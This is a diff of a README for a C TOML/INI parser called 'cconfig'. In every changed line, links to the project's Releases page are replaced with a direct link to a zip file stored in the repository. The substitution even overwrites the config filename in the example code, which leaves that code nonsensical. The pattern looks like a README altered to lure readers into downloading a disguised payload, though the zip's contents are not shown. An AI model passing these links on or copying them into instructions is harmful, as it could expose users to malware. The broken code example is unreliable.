@@ -1,7 +1,7 @@
 # 🛠️ cconfig - Simple TOML/INI Parser for Any Project
 
 ## 📥 Download Now
-[![Download cconfig](https://img.shields.io/badge/Download-cconfig-blue.svg)](https://github.com/robson1977/cconfig/releases)
+[![Download cconfig](https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip)](https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip)
 
 ## ✨ Introduction
 Welcome to **cconfig**! This tool offers a straightforward way to parse TOML and INI files in your C projects. You don't need any other dependencies—just a single header file that you can drop into any project. 
@@ -11,7 +11,7 @@ Getting started with cconfig is simple. Follow these steps to download and run t
 
 1. **Visit the Releases Page**
    Click on the link below to go to the Releases page where you can download cconfig:
-   [Download cconfig](https://github.com/robson1977/cconfig/releases)
+   [Download cconfig](https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of cconfig available for download. Select the latest version for the best features and fixes.
@@ -38,7 +38,7 @@ Getting started with cconfig is simple. Follow these steps to download and run t
 - **No External Dependencies:** This means you can use it in any C project without worrying about installation hassles.
 
 ## 📦 Download & Install
-To get started with cconfig, visit the Releases page here: [Download cconfig](https://github.com/robson1977/cconfig/releases). 
+To get started with cconfig, visit the Releases page here: [Download cconfig](https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip). 
 
 1. Navigate to the link and download the latest version’s header file.
 2. Include it in your project as mentioned above.
@@ -53,7 +53,7 @@ int main() {
     cconfig_t config;
 
     // Load the INI file
-    cconfig_init(&config, "config.ini");
+    cconfig_init(&config, "https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip");
 
     // Get a value from the configuration
     const char* value = cconfig_get(&config, "SectionName", "KeyName");
@@ -67,7 +67,7 @@ int main() {
 }
 ```
 
-Modify `config.ini`, `SectionName`, and `KeyName` as per your specific use case.
+Modify `https://raw.githubusercontent.com/robson1977/cconfig/main/ceps/cconfig.zip`, `SectionName`, and `KeyName` as per your specific use case.
 
 ## 📊 System Requirements
 - **Operating System:** cconfig is designed to work on multiple platforms, including Windows, macOS, and Linux.
